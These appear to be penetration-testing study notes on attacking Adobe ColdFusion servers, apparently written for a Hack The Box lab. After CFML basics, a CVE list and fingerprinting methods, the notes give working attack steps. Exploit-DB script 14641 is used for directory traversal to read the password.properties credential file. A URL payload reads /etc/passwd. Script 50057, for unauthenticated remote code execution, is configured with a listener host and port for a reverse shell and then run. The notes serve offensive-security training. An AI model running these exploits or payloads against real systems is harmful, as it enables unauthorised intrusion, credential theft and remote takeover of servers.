ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications.
For instance, the `cfquery` tag can execute SQL statements to retrieve data from a database:

`<cfquery name="myQuery" datasource="myDataSource">`
`SELECT *  FROM myTable`
`</cfquery>`

Developers can then use the `cfloop` tag to iterate through the records retrieved from the database:
```html
<cfloop query="myQuery"> 
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
1. [CVE-2013-0632](https://nvd.nist.gov/vuln/detail/CVE-2013-0632): Remote code execution vulnerability
2. [CVE-2013-0629](https://nvd.nist.gov/vuln/detail/CVE-2013-0629): Directory traversal and sensitive file disclosure
3. [CVE-2010-2861](https://nvd.nist.gov/vuln/detail/CVE-2010-2861): Directory traversal and arbitrary file reading vulnerability
4. [CVE-2018-15961](https://nvd.nist.gov/vuln/detail/CVE-2018-15961): Arbitrary file upload leading to remote code execution
5. [CVE-2023-26360](https://nvd.nist.gov/vuln/detail/CVE-2023-26360): Pre-authentication remote code execution vulnerability

# Ports and Enumeration

| Port Number | Protocol       | Description                                                                                                                                                            |
| ----------- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80          | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                         |
| 443         | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                          |
| 1935        | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device. |
| 25          | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                               |
| 8500        | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                           |
| 5500        | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                               |

|**Method**|**Description**|
|---|---|
|`Port Scanning`|ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.|
|`File Extensions`|ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.|
|`HTTP Headers`|Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.|
|`Error Messages`|If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.|
|`Default Files`|ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.|

The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.

# Attacking Cold Fusion
`searchsploit adobe coldfusion`
`searchsploit -p 14641
`cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .`
`python2 14641.py`
`python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"`


### Directory Traversal
* `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

`http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en`
`http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd`


# Unauthenticated RCE
```shell
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
```Shell
python3 50057.py
```
